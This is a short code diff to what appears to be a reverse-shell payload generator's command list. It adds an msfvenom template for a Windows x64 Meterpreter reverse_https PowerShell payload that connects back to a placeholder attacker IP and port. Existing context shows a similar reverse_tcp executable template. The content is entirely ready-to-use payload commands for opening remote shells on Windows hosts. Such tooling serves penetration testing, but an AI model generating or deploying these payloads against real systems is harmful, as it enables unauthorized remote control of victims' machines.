@@ -404,6 +404,12 @@ const msfvenomCommands = withCommandType(
     CommandType.MSFVenom,
     [
         {
+            "name": "Windows Meterpreter via powershell MEM execution (x64)",
+            "command": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT={port} -o reverse.ps1 -f psh",
+            "meta": ["msfvenom", "windows", "powershell", "meterpreter", "reverse", "staged"]
+        },
+        {
+
             "name": "Windows Meterpreter Staged Reverse TCP (x64)",
             "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
             "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
